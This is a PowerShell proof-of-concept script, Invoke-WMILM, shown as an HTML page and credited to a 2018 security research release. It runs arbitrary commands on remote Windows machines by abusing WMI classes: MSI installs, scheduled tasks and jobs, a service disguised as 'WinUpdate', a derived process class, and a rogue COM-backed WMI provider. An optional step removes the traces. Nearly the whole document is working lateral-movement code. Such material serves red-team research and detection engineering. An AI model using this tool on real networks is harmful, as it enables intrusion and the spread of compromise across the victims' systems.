<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Invoke-WMILM.ps1</title>
</head><body>&lt;#<br/>
&nbsp;Proof of Concept for Alternative WMI Lateral Movenent Methods<br/>
&nbsp; &nbsp; Copyright (C) 2018 Cybereason<br/>
<br/>
&nbsp; &nbsp; This program is free software: you can redistribute it and/or modify<br/>
&nbsp; &nbsp; it under the terms of the GNU Affero General Public License as<br/>
&nbsp; &nbsp; published by the Free Software Foundation, either version 3 of the<br/>
&nbsp; &nbsp; License, or (at your option) any later version.<br/>
<br/>
&nbsp; &nbsp; This program is distributed in the hope that it will be useful,<br/>
&nbsp; &nbsp; but WITHOUT ANY WARRANTY; without even the implied warranty of<br/>
&nbsp; &nbsp; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. &nbsp;See the<br/>
&nbsp; &nbsp; GNU Affero General Public License for more details.<br/>
<br/>
&nbsp; &nbsp; You should have received a copy of the GNU Affero General Public License<br/>
&nbsp; &nbsp; along with this program. &nbsp;If not, see &lt;http://www.gnu.org/licenses/&gt;.<br/>
&nbsp; &nbsp;<br/>
&nbsp; &nbsp; Author: Philip Tsukerman<br/>
#&gt;<br/>
<br/>
<br/>
function Invoke-WMILM {<br/>
&lt;#<br/>
&nbsp; &nbsp; .DESCRIPTION<br/>
&nbsp; &nbsp; Run code on a remote machine, without (at least directly) using the Win32_Process class<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Target<br/>
&nbsp; &nbsp; Hostname or IP of the target machine<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Type<br/>
&nbsp; &nbsp; The Type of technique to be used<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Name<br/>
&nbsp; &nbsp; Supplies fields such as service name, to techniques needing it<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Command<br/>
&nbsp; &nbsp; Executable to run<br/>
<br/>
&nbsp; &nbsp; .PARAMETER CommandArgs<br/>
&nbsp; &nbsp; Arguments to the executable<br/>
<br/>
&nbsp; &nbsp; .PARAMETER CleanUp<br/>
&nbsp; &nbsp; Should we try to clean up artifacts created on the target machine?<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Username<br/>
&nbsp; &nbsp; Username for target machine<br/>
<br/>
&nbsp; &nbsp; .PARAMETER Password<br/>
&nbsp; &nbsp; Password for target machine <br/>
#&gt;<br/>
<br/>
&nbsp; &nbsp; [CmdletBinding()]<br/>
&nbsp; &nbsp; Param (<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Target,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $true, Position = 1)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateSet("Product", "Service", "Job", "Task", "Provider", "DerivedProcess")]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Type = "Service",<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $false, Position = 2)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Name = "WinUpdate",<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $false, Position = 3)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Command,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $false, Position = 4)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $CommandArgs,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $false, Position = 5)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Bool]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $CleanUp = $false,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $true, Position = 6)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [string]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Username,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $true, Position = 7)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [string]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Password<br/>
&nbsp; &nbsp; )<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; Process {<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Create a remote CIM session<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $SecurePass = ConvertTo-SecureString -String $Password -asplaintext -force<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $cred = new-object -typename System.Management.Automation.PSCredential -ArgumentList @($Username, $SecurePass)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Opt = New-CimSessionOption -Protocol "DCOM"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Session = New-Cimsession -ComputerName $Target -SessionOption $Opt -Credential $Cred<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement using the Win32_Product class. Command needs to be a path to an msi file on the victim<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ($Type -Match "Product") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Installing package '$Command'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = &nbsp;Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = $Command; Options = ""; AllUsers = $false}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -ne 1603){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Failed to install package. ERROR: $($Result.ReturnValue) "<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement using the PS_ScheduledTask classes. Enabling cleanup deletes the task after running. Requires Win8+<br/>
&nbsp; &nbsp; &nbsp; &nbsp; elseif ($Type -Match "Task") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Try {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Creating scheduled task names $Name with command '$Command $CommandArgs'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Action = New-ScheduledTaskAction -Execute $Command -Argument $CommandArgs -WorkingDirectory "c:\windows\system32" -CimSession = $Session<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Register-ScheduledTask -Action $Action -TaskName $Name -CimSession $Session<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-ScheduledTask -TaskName $Name<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Cleanup -eq $true) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Unregister-ScheduledTask -TaskName $Name -Confirm:$false -CimSession $Session<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Catch {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Task creation failed. Are you sure target is Win8+?"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement using the Win32_ScheduledJob class. Enabling cleanup deletes the task after running. Does not work on Win8+<br/>
&nbsp; &nbsp; &nbsp; &nbsp; elseif ($Type -Match "Job") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_ScheduledJob -MethodName Create -Arguments @{Command="$Command $CommandArgs"; StartTime=(Get-Date).AddSeconds(30)}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Creating scheduled job with command '$Command $CommandArgs' to run in 30 seconds"<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -eq 8) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Scheduled job creation failed. Are you sure at.exe is supported on target machine?"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($result.ReturnValue -ne 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Scheduled job creation failed. Error $($Result.ReturnValue)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Cleanup -eq $true) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Sleeping to let the task execute, and then deleting it"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep 30<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-CimMethod -InputObject (Get-CimInstance -CimSession $Session -Query "SELECT * FROM Win32_ScheduledJob WHERE JobId = $($Result.JobId)") -MethodName Delete<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement using the Win32_Service class. Enabling cleanup deletes the service after running<br/>
&nbsp; &nbsp; &nbsp; &nbsp; elseif ($Type -Match "Service") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Creating and running a new service with name $Name and command '$Command $CommandArgs'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = $Name; DisplayName = $Name; PathName = "$Command $CommandArgs"; ServiceType = [byte]::Parse("16"); StartMode = "Manual"}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -ne 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Write-Warning "Service creation failed. Error $($Result.ReturnValue)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break &nbsp; &nbsp; &nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$Name'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-CimMethod -InputObject $Service -MethodName StartService<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if ($Cleanup -eq $true) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Deleting service"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-CimMethod -InputObject $Service -MethodName StopService<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-CimMethod -InputObject $Service -MethodName Delete<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement by derivation from the Win32_Process class. New class name will be the $Name parameter prefixed with 'Win32_'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; elseif ($Type -Match "DerivedProcess") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Creating a subclass of Win32_Process named Win32_$Name"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Options = New-Object Management.ConnectionOptions<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Options.Username = $Username<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Options.Password = $Password<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Options.EnablePrivileges = $True<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Connection = New-Object Management.ManagementScope<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Connection.Path = "\\$Target\root\cimv2"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Connection.Options = $Options<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Connection.Connect()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Path = New-Object Management.ManagementPath("Win32_Process")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Class = New-Object Management.ManagementClass($Connection, $Path, $null)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $NewClass = $Class.Derive("Win32_$Name")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $NewClass.Put()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Host "Using Win32_$Name to create a new process with command line '$Command $CommandArgs'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName "Win32_$Name" -MethodName Create -Arguments @{CommandLine = "$Command $CommandArgs"}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -ne 0){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Could not create process. ERROR $($Result.ReturnValue)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # Lateral movement using WMI provider registration. Cleanup option removes the provider instance and the associated COM object<br/>
&nbsp; &nbsp; &nbsp; &nbsp; elseif ($Type -Match "Provider") {<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [UInt32]$Hklm = 2147483650 # Int represenation of the HKLM hive<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Guid = ([Guid]::NewGuid()).Guid.ToUpper()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Key = "SOFTWARE\Classes\CLSID\{$Guid}"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $Key<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -ne 0){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = ""; sValue = "$Name"}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Key = "SOFTWARE\Classes\CLSID\{$Guid}\LocalServer32"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $key<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Result.ReturnValue -ne 0){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = ""; sValue = "$Command $CommandArgs"}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Prov = New-CimInstance -CimSession $Session -ClassName __Win32Provider -Arguments @{CLSID = "{$Guid}"; Name = $Name}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-CimMethod -CimSession $Session -ClassName Msft_Providers -MethodName Load -Arguments @{Namespace = "root/CIMV2"; Provider="$Name"}<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($Cleanup -eq $true) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Remove-CimInstance -InputObject $Prov<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName DeleteKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; End {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Output "The End!"<br/>
&nbsp; &nbsp; }<br/>
}</body></html>